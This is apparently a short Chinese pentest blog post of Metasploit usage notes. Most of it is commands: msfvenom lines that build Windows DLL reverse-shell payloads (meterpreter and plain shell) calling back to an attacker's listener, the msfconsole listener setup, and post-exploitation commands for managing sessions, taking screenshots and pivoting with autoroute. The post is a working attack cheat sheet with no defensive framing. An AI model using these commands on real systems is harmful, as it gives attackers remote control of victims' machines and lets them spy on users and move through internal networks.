Title: metasploit用法
Category: Pentest
Date: 2017-5-17
slug: metasploit

##生成payload

```
msf监听：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.141.35 LPORT=8000 -f dll > ~/Desktop/s2.dll

nc监听：
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=6666 -f dll > s2.dll      

```


###监听

```
set lhost x.x.x.x
set lport xxx
set PAYLOAD windows/x64/meterpreter/reverse_tcp  //使用对应的payload
exploit
```

###常用命令

```
exploit -j 监听多个会话
background  //会话置于后台
sessions 查看会话
screenshot 截屏
在添加路由表和session的关系后，可以使用msf的模块扫描网段，可以使用autoroute快速添加路由表，也可以把当前session置于后台，然后使用route命令添加:
run autoroute -s [ip]
```

通过vps使用本地msf
<https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html>测试未成功

* <http://wooyun.jozxing.cc/static/drops/tips-783.html>
* <http://wooyun.jozxing.cc/static/drops/tips-2227.html>

